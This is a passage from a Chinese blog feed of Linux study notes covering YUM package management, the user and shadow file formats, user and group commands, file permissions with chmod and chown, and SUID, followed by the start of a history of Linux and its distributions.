data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625195926147-916f662e-785e-4167-9e2a-d36c936907cb.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625195971599-95e7519c-b1c0-4170-8d67-efe86cced00a.png" alt="img"></p><p>③打开下载的文件并在此处打开终端</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625196015620-c67614ad-5549-4849-960e-b0c64fcbc897.png" alt="img"></p><p>④切换 root 权限安装 QQ</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625196231319-a165eaaa-ff87-4ff8-8cc5-c1c089f2c8fd.png" alt="img"></p><p>⑤安装成功</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625196307498-8ada1746-d7de-4b37-899e-08bd583e8093.png" alt="img"></p><h2 id="二yum软件包管理"><a class="markdownIt-Anchor" href="#二yum软件包管理">#</a> 二：YUM 软件包管理</h2><h3 id="1yum管理软件包"><a class="markdownIt-Anchor" href="#1yum管理软件包">#</a> 1.YUM 管理软件包</h3><h4 id="yum简介"><a class="markdownIt-Anchor" href="#yum简介">#</a> yum 简介</h4><p>rpm 软件包虽然方便，但是需要手动解决软件包的依赖关系的问题。YUM（yellowdog updater Modified）是 RPM 的前端程序，主要设计用来解决 RPM 依赖关系问题。特点如下：</p><ul><li><p>自动解决依赖关系</p></li><li><p>对 RPM 进行分组，并基于组进行安装操作</p></li><li><p>引入仓库概念，支持多个仓库</p></li><li><p>配置简单</p></li></ul><p>​        yum 引入仓库（repo）的概念，仓库用来存放所有现有的 rpm 软件包，当使用 yum 安装一个 rpm 软件时，如果存在依赖关系，会自动在仓库中查找依赖关系并安装。仓库可以使本地的，也可以通过 HTTP、FTP 或 NFS 形式使用集中的、统一的网络仓库。仓库的配置文件保存在 /etc/yum.repos.d/ 目录下，格式如下：</p><p>[LinuxRPM]（节点名称）</p><p>name=RPM（仓库的描述）</p><p>baseurl=（本地 file、HTTP、FTP、NFS）仓库文件的路径</p><p>enabled=1（启用仓库）</p><p>gpgcheck=1（启用签名校验）（生产环境中一般需要打开）</p><h4 id="更新yum库"><a class="markdownIt-Anchor" href="#更新yum库">#</a> 更新 yum 库</h4><p>yum makecache</p><h4 id="软件安装"><a class="markdownIt-Anchor" href="#软件安装">#</a> 软件安装</h4><p>yum provides *bin / 软件查找软件的包名</p><p>yum -y install 包名安装软件，-y 是参数自动确定</p><p>yum -y reinstall 包名重新安装</p><p>yum -y update 包名升级一个软件</p><p>yum -y update 更新所有软件</p><h4 id="查询"><a class="markdownIt-Anchor" href="#查询">#</a> 查询</h4><p>yum list 包名查看安装包的位置</p><h4 id="卸载"><a class="markdownIt-Anchor" href="#卸载">#</a> 卸载</h4><p>yum -y remove 包名卸载软件</p><h3 id="2配置本地yum源"><a class="markdownIt-Anchor" href="#2配置本地yum源">#</a> 2. 配置本地 YUM 源</h3><p>++</p><h3 id="3配置网络yum源"><a class="markdownIt-Anchor" href="#3配置网络yum源">#</a> 3. 配置网络 YUM 源</h3><p>++</p><h2 id="三磁盘文件管理"><a class="markdownIt-Anchor" href="#三磁盘文件管理">#</a> 三：磁盘文件管理</h2><p>++ 磁盘文件格式</p><p>++ 实战添加硬盘划分区</p><h2 id="四用户及权限管理"><a class="markdownIt-Anchor" href="#四用户及权限管理">#</a> 四：用户及权限管理</h2><h3 id="1创建-修改和删除用户与组"><a class="markdownIt-Anchor" href="#1创建-修改和删除用户与组">#</a> 1. 创建、修改和删除用户与组</h3><h4 id="11用户信息可以通过查询etcpasswd文件每一行代表一个用户信息"><a class="markdownIt-Anchor" href="#11用户信息可以通过查询etcpasswd文件每一行代表一个用户信息">#</a> 1.1 用户信息可以通过查询 /etc/passwd 文件，每一行代表一个用户信息</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625204400716-e509a7c9-0a41-48ee-802f-a83ede0b9aa3.png" alt="img"></p><p>每个冒号分隔一部分，整行总共分为 7 个部分</p><p>①用户名</p><p>②用户密码，早期版本的账号密码是直接存在这里，为了兼容所以也保留下了这部分，用 X 代替</p><p>③UID：所属的用户 ID, 每个文件的前面都有该文件所属的用户和组，其实存的是 UID 只不过是通过 UID 再去 etc/passwd、/etc/shadow 中找到对应的 UID 和 GID 的名称。</p><p>超级用户的 uid=0</p><p>系统用户（1-499）：其中 1-99 是系统创建的，100-499 是用户创建的系统账户，系统用户不能登入但是可以执行系统的一些命令，这个跟最后指定的 shell 有关；有一个特殊的 shell 是 /sbin/nologin</p><p>普通用户（500-65535）</p><p>④GID：账号所属的用户组的 ID，和 /etc/group 组文件有关联</p><p>⑤用户描述</p><p>⑥用户的家目录：常见用户的家目录默认是在 /home/ 用户 /，在创建用户的时候可以指定用户的家目录，系统用户的家目录比较特殊，比如 root 用户的家目录是 /root</p><p>⑦shell：shell 是终端和 kernel (内核) 沟通的桥梁、内核再和低层的硬件交互（包括 CPU、主板、硬盘、显卡、光驱等），linux 默认的 shell 是 /bin/bash</p><h4 id="12密码信息可以通过查询etcshadow文件总共分为九个部分"><a class="markdownIt-Anchor" href="#12密码信息可以通过查询etcshadow文件总共分为九个部分">#</a> 1.2 密码信息可以通过查询 /etc/shadow 文件，总共分为九个部分</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625204835321-0e713f79-aa04-4db6-9531-a34f2cfba0af.png" alt="img"></p><p>①用户名：对应 /etc/password 文件中的用户信息</p><p>②密码：密码存的是密文</p><p>③最近更改密码的日期：linux 将 1970 年 1 月 1 日作为 1，所以上面的 16862 是累加的，具体就不去算了</p><p>④密码不可被更改的天数：0 代表密码随时可以被更改，通常可以用来设置某个用户在多少天密码不能被更改</p><p>⑤密码需要重新更改的天数：99999 为 273 年，改时间是在第 3 部分的基础上再相加的。</p><p>⑥密码需要修改前的警告天数：改天数是在第 5 的基础上计算的，这里默认是 7 天也就是密码在需要更改前的第 7 天开始就发出警告。</p><p>⑦密码过期后账号宽限的天数：当密码超过了需要更改的天数后，如果用户依然没有更改密码，那么该密码就过期了，在过期的这几天里密码依旧可以登入当用户在宽限的时间内登入系统系统会强制用户修改密码，如果用户在宽限的天内还未修改密码那么密码就永久过期无法再登入，只有账户超出了密码过期的天数之后账户才失效，所以一个账户总的有效时间是 3+6+7。</p><p>⑧用户失效的日期：改日期同第 3 部分一样都是从 1970 年 1 月 1 日开始计算出来的数字，超过这个日期之后无论用户密码是否过期用户都失效不能再使用，改日期通常会用在规定一个用户在规定的日期之后就用户就不能使用的收费系统中。</p><p>⑨保留部分</p><p>计算当前日期通过 1970 年换算过来的数字</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625205876138-c87a6372-9d41-4133-b427-b190e23eb126.png" alt="img"></p><p>计算指定日期通过 1970 年换算过来的数字</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625205888160-928bc819-d90f-4646-bc25-939bb2d15514.png" alt="img"></p><h4 id="13创建用户"><a class="markdownIt-Anchor" href="#13创建用户">#</a> 1.3 创建用户</h4><p>明白了上面的概念之后就可以来创建用户了，创建用户的命令是 useradd, 接下来看几个主要的参数。</p><p>useradd [-u UID] [-g 初始群组] [-G 次要群组] [-m\M] [-c 说明] [-d 家目录绝对路径] [-s shell] 账号名</p><p>-c, --comment COMMENT         用户说明</p><p>-d, --home-dir HOME_DIR       用户的家目录</p><p>-D, --defaults                默认的用户配置</p><p>-e, --expiredate EXPIRE_DATE  用户的失效日期，这里需要指定的是从 1970 年 1 月 1 日开始计算出来的数字，比如 16925 代表 2016 年 5 月 4 日过期，对应密码文件的第 8 部分</p><p>-f, --inactive INACTIVE       指定密码过期的时间，这里指定的是数字，比如 10 代表密码在过期的 10 天内还可以登入但是登入后需要强制修改密码， 对应密码文件的第 7 部分</p><p>-g, --gid GROUP               用户的 GID</p><p>-G, --groups GROUPS           列出用户还能加人的组、次要组<br> - h, --help                    帮助信息</p><p>-k, --skel SKEL_DIR           use this alternative skeleton directory</p><p>-K, --key KEY=VALUE           override /etc/login.defs defaults</p><p>-l, --no-log-init             do not add the user to the lastlog and faillog databases</p><p>-m, --create-home             强制需要创建家目录</p><p>-M, --no-create-home          强制不创建家目录</p><p>-N, --no-user-group           不创建用户的组名和用户名一样</p><p>-o, --non-unique              允许创建的用户 uid 相同，默认情况下用户的 UID 是唯一的，加上 - o 参数可以创建相同 UID 的不用用户<br> - p, --password PASSWORD       指定创建用户的密码，这里的密码存储的是密文，所以还需要知道密文对应的明文密码是多少</p><p>-r, --system                 创建一个系统用户</p><p>-s, --shell SHELL             指定用户的 shell</p><p>-u, --uid UID                 指定用户的 uid</p><p>-U, --user-group              创建的用户组名同用户名，这是默认的</p><p>-Z, --selinux-user SEUSER     use a specific SEUSER for the SELinux user mapping</p><h4 id="131创建test用户"><a class="markdownIt-Anchor" href="#131创建test用户">#</a> 1.3.1 创建 test 用户</h4><p>创建用户不加参数默认会创建一个同名的用户组、密码为空，用户的 UID 和 GID 都是 500 之后在现有的 UID 和 GID 的基础上往后自动添加、默认会创建一个同名的家目录家目录的默认权限是普通用户</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625205584609-e2563e80-9903-4914-83c1-4b3910167109.png" alt="img"></p><h4 id="132创建用户new备注用户为test指定用户uid为600用户的组初始组为test用户次要组为yuchen指定用户的失效日期注意这里的失效日期也是需要通过1970年1月1日进行换算-指定用户的过期天数"><a class="markdownIt-Anchor" href="#132创建用户new备注用户为test指定用户uid为600用户的组初始组为test用户次要组为yuchen指定用户的失效日期注意这里的失效日期也是需要通过1970年1月1日进行换算-指定用户的过期天数">#</a> 1.3.2 创建用户 new 备注用户为 test，指定用户 uid 为 600，用户的组初始组为 test，用户次要组为 yuchen，指定用户的失效日期（注意这里的失效日期也是需要通过 1970 年 1 月 1 日进行换算）、指定用户的过期天数</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625206730251-631c0348-d51a-40a7-b2c7-7ae49ed6174a.png" alt="img"></p><h4 id="133创建系统用户old"><a class="markdownIt-Anchor" href="#133创建系统用户old">#</a> 1.3.3 创建系统用户 old</h4><p>创建的系统用户虽然在用户文件中有指定家目录，但是实际上在 home 目录下并不会创建对应用户的目录，且不会创建用户邮件通知目录。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625206836970-641ae550-30d4-4372-9422-93b3a33b7b4d.png" alt="img"></p><h4 id="134创建不允许登入的用户"><a class="markdownIt-Anchor" href="#134创建不允许登入的用户">#</a> 1.3.4 创建不允许登入的用户</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625206939397-b5e29001-28cb-461d-bfca-0119ef0ed2b4.png" alt="img"></p><h4 id="135指定用户家目录"><a class="markdownIt-Anchor" href="#135指定用户家目录">#</a> 1.3.5 指定用户家目录</h4><p>先创建用户家目录</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625207169365-368c6863-9fa1-4efd-b158-0e9e8d3772f9.png" alt="img"></p><p>创建用户并指定家目录</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625207183234-e594ddd4-0cec-4253-95d9-31eff550a3fb.png" alt="img"></p><p>注意：这里的家目录是绝对路径，也就是你指定了那个目录家目录就是哪个目录不会在你指定的目录下再创建目录，这里会有警告说用户不能拷贝文件到家目录，因为家目录的权限还是之前创建目录用户的权限，这个时候需要给家目录赋予用户拥有者。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625207315995-9a591b51-7d63-46b9-a01e-443fc6946050.png" alt="img"></p><h4 id="14删除用户"><a class="markdownIt-Anchor" href="#14删除用户">#</a> 1.4 删除用户</h4><p>userdel [options] LOGIN</p><p>-f, --force                   强制删除用户，不管该用户是否在使用<br> - h, --help                    帮助信息<br> - r, --remove                  删除用户和组并且删除用户的家目录和邮件通知目录</p><p>-Z, --selinux-user            删除 SELinux 用户</p><h4 id="141不加参数删除用户"><a class="markdownIt-Anchor" href="#141不加参数删除用户">#</a> 1.4.1 不加参数删除用户</h4><p>userdel testuser</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625207496561-79626833-298b-4c7b-92b8-661ae93d0980.png" alt="img"></p><h4 id="142删除用户同时删除用户的家目录和邮件通知目录"><a class="markdownIt-Anchor" href="#142删除用户同时删除用户的家目录和邮件通知目录">#</a> 1.4.2 删除用户同时删除用户的家目录和邮件通知目录</h4><p>userdel -r test</p><p>使用 - r 参数删除用户会同时删除用户的家目录和用户的邮件通知目录，如果用户的用户组是使用其它用户的用户组，其它用户组不会被删除。</p><h4 id="15用户组"><a class="markdownIt-Anchor" href="#15用户组">#</a> 1.5 用户组</h4><h4 id="151创建用户组"><a class="markdownIt-Anchor" href="#151创建用户组">#</a> 1.5.1 创建用户组</h4><p>groupadd groupname</p><h4 id="152删除用户组"><a class="markdownIt-Anchor" href="#152删除用户组">#</a> 1.5.2 删除用户组</h4><p>groupdel groupname</p><h4 id="153修改用户组"><a class="markdownIt-Anchor" href="#153修改用户组">#</a> 1.5.3 修改用户组</h4><p>修改用户组名</p><p>groupmod -h newname oldname</p><p>修改用户组 ID</p><p>groupmod -g newgid oldgid</p><h3 id="2文件及文件夹权限管理"><a class="markdownIt-Anchor" href="#2文件及文件夹权限管理">#</a> 2. 文件及文件夹权限管理</h3><h4 id="1文件的权限"><a class="markdownIt-Anchor" href="#1文件的权限">#</a> ①文件的权限</h4><ul><li>文件权限的查看</li></ul><p>命令：ls -l</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625208363096-01db518c-8f92-42ca-a65b-6772bc623650.png" alt="img"></p><p>可以使用 ll 命令代替 ls -l</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625208385249-5adfe4d1-4948-4264-9086-c87bd14ed820.png" alt="img"></p><ul><li>ls -l 所包含的信息</li></ul><p>（1）权限信息 （-rw-r–r-- ）</p><p>一共有 10 位</p><p>a. 第一位：表示文件信息</p><p>-：表示普通文件</p><p>d：表示目录</p><p>l：表示软连接（快捷方式）</p><p>b：设备</p><p>p：管道文件</p><p>b. 第 2-4 这三位表示属主的权限 -----------------》字母 u 代替</p><p>-：表示没有权限</p><p>r：读取文件的权限</p><p>w：修改文件的权限</p><p>x：执行文件的权限</p><p>c. 第 5-7 这三位表示属组的权限 -------------------》字母 g 代替</p><p>-：表示没有权限</p><p>r：读取文件的权限</p><p>w：修改文件的权限</p><p>x：执行文件的权限</p><p>d. 第 8-10 这三位表示其他人的权限 ----------------》字母 o 代替</p><p>-：表示没有权限</p><p>r：读取文件的权限</p><p>w：修改文件的权限</p><p>x：执行文件的权限</p><p>（2）安全性</p><p>权限信息后紧跟的是一个点，这个是和 selinux 相关的，表示的是 linux 的安全性，selinux 是一个安全软件。</p><p>（3）硬连接数</p><p>点之后是数字，表示的是硬连接数。</p><p>（4）属主</p><p>之后的 root 表示属主，文件的拥有者。</p><p>（5）属组</p><p>属主之后的 root 表示属组。</p><p>（6）文件大小</p><p>2000 表示文件的创建大小。</p><p>（7）文件创建时间</p><p>之后的时间表示文件的创建时间</p><p>（8）文件名称</p><p>最后一项表示文件名称</p><ul><li>修改权限</li></ul><p>修改权限命令关键词：chmod (change mod)</p><ol><li><ol><li>修改属主权限：chmod u+x 文件路径（追加权限）或者 chmod u=r 文件路径（覆盖权限）</li></ol></li></ol><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625210938497-9c1819e6-4e02-4b69-b796-e938889f9f55.png" alt="img"></p><ol><li><ol><li>修改属组权限：与属主权限的修改类似，可以使用（‘+’，‘-’）号进行权限的修改，也可以使用赋值的方式。</li></ol></li></ol><p>chmod  g+rw 文件路径</p><p>chmod g=— 文件路径 （此处也可以用一个‘-’表示）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625211059776-445716fa-1eaf-4bca-8d33-3ff5295a03b4.png" alt="img"></p><ol><li><ol><li>修改其他人的权限：同以上修改权限的方法相同</li></ol></li></ol><p>chmod o=rwx 文件路径</p><p>chnod  o-x  文件路径</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625211148784-744ca0c1-b420-4d78-b147-84e783c55522.png" alt="img"></p><ol><li><ol><li>写文件的权限</li></ol></li></ol><p>vim 编辑器用于打开文件并进行编辑，vim  文件路径 ------》a 或者 i 进入编辑模式 ----------》进行编辑 -------》esc 退出编辑模式 -------》：（shift+：）-------》wq 保存文件</p><p>如果存在 w 的权限则可以进行编辑，如果没有就不可以。</p><p>注：如果一个人没有读的权限但有写的权限，当他每次写完后，会把文件中原先的内容覆盖掉。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625211207597-8fe75689-ccb4-48b6-b1f2-6c8e48c55245.png" alt="img"></p><ol><li><ol><li>执行可执行文件的权限（x）</li></ol></li></ol><p>注：执行命令有以下的方式</p><p>./ 文件路径</p><p>sh 文件路径</p><p>bash 文件路径</p><ol><li><ol><li>将用户添加到组，从而拥有组权限</li></ol></li></ol><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625212385967-97802389-953d-4967-bc23-06e215e5d8c6.png" alt="img"></p><h4 id="2目录的权限"><a class="markdownIt-Anchor" href="#2目录的权限">#</a> ②目录的权限</h4><p>查看目录的命令：ll -d 文件夹路径</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625214828181-cdc67528-76c5-40ef-b1c4-29b4a985f502.png" alt="img"></p><p>目录的 r 权限</p><p>可以 ls 该目录下的文件以及子目录</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625214838578-8850375b-e60d-49dc-8fd2-1ad855735a18.png" alt="img"></p><p>目录的 w 权限</p><p>添加文件权限</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625214848032-efaf0592-ec6b-4608-a1b0-729c179c59ea.png" alt="img"></p><p>删除文件的权限</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625214857821-c5ab5a68-d2b2-45d9-832e-bf59f14c5ff0.png" alt="img"></p><p>重命名文件</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625214867489-13b0ab79-15df-486a-9dd2-8dcb9384b1fa.png" alt="img"></p><p>目录的可执行权限</p><p>目录的 x 权限就是 cd 命令</p><p>注：目录中船舰文件必须需要有执行权限，w 的权限是不够的，因为需要 cd 进目录中进行创建</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625215247645-27745cb8-ef82-4603-9106-44e620c01429.png" alt="img"></p><p>注：权限不受 root 以及属主限制，即使修改了权限限制</p><h4 id="3属主属组的更改"><a class="markdownIt-Anchor" href="#3属主属组的更改">#</a> ③属主，属组的更改</h4><p>更改属主、属组关键字 chown (change owner)</p><p>属主更改</p><p>chown 属主 文件或者目录路径</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625215831719-940c32b8-2931-448a-ae6a-619bcd72f90f.png" alt="img"></p><p>属组更改</p><p>chown . 属组 文件或者目录路径</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625215884205-d26d1484-3813-4d8e-ac91-8d5118136157.png" alt="img"></p><p>属主、属组都进行修改</p><p>chown 属主。属组 文件或者目录路径</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625215894512-1c48bd60-0d88-4d93-ad7d-3a78701640da.png" alt="img"></p><h4 id="4基于数字的权限管理"><a class="markdownIt-Anchor" href="#4基于数字的权限管理">#</a> ④基于数字的权限管理</h4><p>属主、属组以及其他人的权限更改还可以使用数字进行权限的更改</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625216303102-30f4d111-b63b-45c0-9edd-228a021d705c.png" alt="img"></p><h3 id="3特殊权限suid"><a class="markdownIt-Anchor" href="#3特殊权限suid">#</a> 3. 特殊权限 SUID</h3><h4 id="1setuid的功能"><a class="markdownIt-Anchor" href="#1setuid的功能">#</a> 1：SetUID 的功能</h4><p>只有可以执行的二进制程序才能设定 SUID 权限。（给其他文件设置没有意义），命令执行者要对该程序拥有 x（执行）权限，命令执行者在执行该程序时获得该程序文件所有着的身份（在执行程序的过程中灵魂附体为文件的属主，相当于变身命令），SetUID 权限指在该程序执行过程中有效，也就是说身份改变只在程序执行过程中有效。</p><p>passwd 命令拥有 SetUID 权限，所以普通用户可以修改自己的密码</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625216451672-6b808dfb-a05e-4424-81ff-a00ce145cee7.png" alt="img"></p><p>在所有者的权限里面有 s 就是 SUID 权限，在所属组里面有 s 就是 SGID 权限，在其他人里面有 s 就是 SBID</p><p>cat 命令没有 SetUID 权限，所以普通用户不能查看 /etc/shadow 文件内容</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625216961490-bb2f832a-fe56-4205-8b4d-0d854e598bcc.png" alt="img"></p><h4 id="2设定setuid的方法"><a class="markdownIt-Anchor" href="#2设定setuid的方法">#</a> 2. 设定 SetUID 的方法</h4><p>4 代表 SUID，2 表示 SGID，1 表示 SBID    7 表示 SUID,SGID,SBID 都有，chmod 4755 文件名； chmod u+s 文件名</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625217254485-53544eb7-f6af-4c06-bab3-e383dcbfe855.png" alt="img"></p><p>如果使用 chmod u+s test</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625217343589-f0e0095d-fb2d-42b2-85c1-4664907bb6c4.png" alt="img"></p><p>s 是大写的这是因为出错了，因为 SetUID 的功能说明中强调命令执行者要对该程序有执行权限，所以会报错</p><h4 id="3取消setuid的方法"><a class="markdownIt-Anchor" href="#3取消setuid的方法">#</a> 3. 取消 SetUID 的方法</h4><p>使用 chmod 命令吧文件的权限修改为以前的，或者使用 u-s 文件名来修改</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625217588791-1d00ff85-488d-401a-9775-e1db3f2e87e6.png" alt="img"></p><h4 id="4危险的setuid"><a class="markdownIt-Anchor" href="#4危险的setuid">#</a> 4. 危险的 SetUID</h4><p>最好不要随便修改</p><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二天软件包管理与权限管理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第二天软件包管理与权限管理&quot;&gt;#&lt;/a&gt; 第二天：软件包管理与权限管理&lt;/h1&gt;
&lt;h2 id=&quot;一rpm软件包管理&quot;&gt;&lt;a class=&quot;markdownIt-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/linux%E5%8F%91%E5%B1%95%E4%B8%8E%E5%9F%BA%E7%A1%80/"/>
    <id>https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/linux%E5%8F%91%E5%B1%95%E4%B8%8E%E5%9F%BA%E7%A1%80/</id>
    <published>2022-03-08T07:36:55.741Z</published>
    <updated>2022-03-16T02:11:45.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux的发展与基础"><a class="markdownIt-Anchor" href="#linux的发展与基础">#</a> linux 的发展与基础</h1><h2 id="1linux发展历史"><a class="markdownIt-Anchor" href="#1linux发展历史">#</a> 1：linux 发展历史</h2><h3 id="11linux发展历史"><a class="markdownIt-Anchor" href="#11linux发展历史">#</a> 1.1：Linux 发展历史</h3><h4 id="1诞生"><a class="markdownIt-Anchor" href="#1诞生">#</a> ①：诞生</h4><p>20 世纪 60 年代，出现并流行交互式操作系统，即分时操作系统。其中 multics 就是一套由贝尔实验室、麻省理工学院及美国通用电气公司的 1964 年共同参与研发出的安装在大型主机上实现多人多工的操作系统。但由于资金的超支及贝尔实验室的退出等因素而被 “放弃”。</p><p>随后贝尔实验室的 Ken Thompson 使用 B 语言开发出了名为 Unics 操作系统，后改名为 UNIX 操作系统。</p><p>由于 B 语言进行系统编程时不够强大，因此 Thompson 联合 Ritchie 对其进行了改造，并于 1971 年共同发明了 C 语言。1973 年 Thompson 和 Ritchie 用 C 语言重写了 UNIX。自此到 20 世纪 90 年代 UNIX 已经成为大学中的主流操作系统。与此同时，UNIX 转向商业化，价格昂贵。而唯一低廉的选择就是 MINIX，这是一个功能有限的类似 UNIX 的操作系统，作者 Andrew Tanenbaum 开发它的目的是用于教学。</p><p>1991 年初，Linus Torvalds 接触到 UNIX 操作系统，通过学习 MINIX 成功地将自己开发的 bash 移植到了 minix 上，并于 1991 年 10 月正式向外宣布 Linux 内核的诞生。同年，GNU 计划已经开发出了许多工具软件，最受期盼的 GNU C 编译器已经出现，GNU 的操作系统核心 HURD 一直处于实验阶段，没有任何可用性，实质上也没能开发出完整的 GNU 操作系统，但是 GNU 奠定了 Linux 用户基础和开发环境。<br>Linux 本身只是操作系统的内核。内核是使其它程序能够运行的基础。它实现了多任务和硬件管理，用户或者系统管理员交互运行的所有程序实际上都运行在内核之上。其中有些程序是必需的，比如说，命令行解释器（shell），它用于用户交互和编写 shell 脚本。 Linux 没有自己去开发这些应用程序，而是使用已有的自由软件。许多重要的软件，包括 C 编译器，都来自于自由软件基金 GNU 项目。因此，把 Linux 也称为 GNU/Linux。</p><h4 id="2linux-诞生大事件"><a class="markdownIt-Anchor" href="#2linux-诞生大事件">#</a> ②：Linux 诞生大事件</h4><p>1965 年，Bell 实验室、MIT、GE（通用电气公司）开发 Multics（Multiplexed Information and Computing Service）系统。</p><p>1969 年，Ken Thompson（C 语言之父）利用汇编语言（B 语言）开发了 File Server System（Unics，即 UNIX 的原型）。</p><p>1973 年，Dennis Ritchie 和 Ken Thompson 发明了 C 语言，随后二人使用 C 语言重写 UNIX 的内核。</p><p>1977 年，Berkeley 大学的 Bill Joy （ Sun 公司的创始人）针对他的机器修改了 UNIX 源码，称为 BSD（Berkeley Software Distribution）操作系统。</p><p>1979 年，UNIX 发布 System V，用于个人计算机；1984 年，因为 UNIX 规定 “不能对学生提供源码”，作为老师的 Andrew Tanenbaum 编写兼容于 UNIX 的 Minix，用于教学。</p><p>1984 年，Richard Stallman 开始 GNU（GNU’s Not Unix）项目，创办 FSF（Free Software Foundation）基金会。该组织倡导 “自由软件”，开发了 GCC、Emacs、Bash Shell、GLIBC 等产品；GNU 的软件缺乏一个开放的平台运行，只能在 UNIX 上运行；自由软件指用户可以对软件做任何修改，甚至再发行，但要遵守 GPL 的版权规定；自由软件是可以卖的，但是不能只卖软件，而是卖服务、手册等。</p><p>1985 年，为了避免 GNU 开发的自由软件被其他人用作专利软件，因此创建 GPL（General Public License）版权声明。</p><p>1988 年，MIT 为了开发 GUI，成立了研发 XFree86 的组织。</p><p>1991 年，芬兰赫尔辛基大学的研究生 Linus Torvalds 基于 gcc、bash 开发了针对 386 机器的 Linux 内核。</p><p>1994 年，Torvalds 发布 Linux-v1.0。</p><p>1996 年，Torvalds 发布 Linux-v2.0，确定了 Linux 的吉祥物：企鹅。</p><h4 id="3unix进化史"><a class="markdownIt-Anchor" href="#3unix进化史">#</a> ③：UNIX 进化史</h4><p>Unix 是较早被广泛使用的计算机操作系统之一，它的第一版于 1969 年由 Ken Thompson 在 AT&amp;T 贝尔实验室实现，1973 年 Ken Thompson 与 Dennis Ritchie 用 C 语言重写了 Unix 的第三版内核。</p><p>1969 年，Unix 系统的第一个版本（由 Ken Thompson 在 AT&amp;T 贝尔实验室实现）</p><p>20 世纪 70 年代末：AT&amp;T 成立 Unix 系统实验室</p><p>20 世纪 70 年代末：CSRG（加州大学伯克利分校计算机系统研究小组）使用 Unix 对操作系统进行研究</p><p>BSD Unix 和 Unix System V 形成了当今 Unix 的两大主流</p><h3 id="12linux发行版本"><a class="markdownIt-Anchor" href="#12linux发行版本">#</a> 1.2：linux 发行版本</h3><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1624002003577-d9e2daa8-2dba-4d96-95b8-d5da34604cba.png" alt="img"></p><h4 id="debian-家族"><a class="markdownIt-Anchor" href="#debian-家族">#</a> Debian 家族</h4><p>Debian 最早由 Ian Murdock 于 1993 年创建，是社区类 Linux 的典范，也是迄今为止最遵循 GNU 规范的 Linux 系统。Debian 在服务器和桌面电脑领域都有着广泛的应用，最具特色的是 apt-get /dpkg 包管理方式。</p><p>Ubuntu 是基于 Debian 发展而来，界面友好，易于上手，而且对硬件的支持也很全面，比较适用于桌面系统。Ubuntu 本身又有很多不同的版本，比如基于 KDE 的 Kubuntu，基于极致轻量的 LXDE 的 Lubuntu，中国定制版的 Ubuntu Kylin 等。</p><p>Linux Mint 由 Linux Mint Team 团队于 2006 年开始发行，基于 Ubuntu 衍生，是专注于个人用户的桌面系统，界面更加美观。</p><h4 id="red-hat家族"><a class="markdownIt-Anchor" href="#red-hat家族">#</a> Red Hat 家族</h4><p>Red Hat 红帽公司创建于 1993 年，是目前世界上最知名的 Linux 厂商之一。Red Hat 公司产品主要包括：</p><p>RHEL (Red Hat Enterprise Linux 红帽企业版 Linux)，是商业版本，源代码公开，技术支持需要付费，提供原厂服务。</p><p>Fedora 是基于 Red Hat Linux 的社区版，由 Fedora Project 社区开发、红帽公司赞助。Fedora 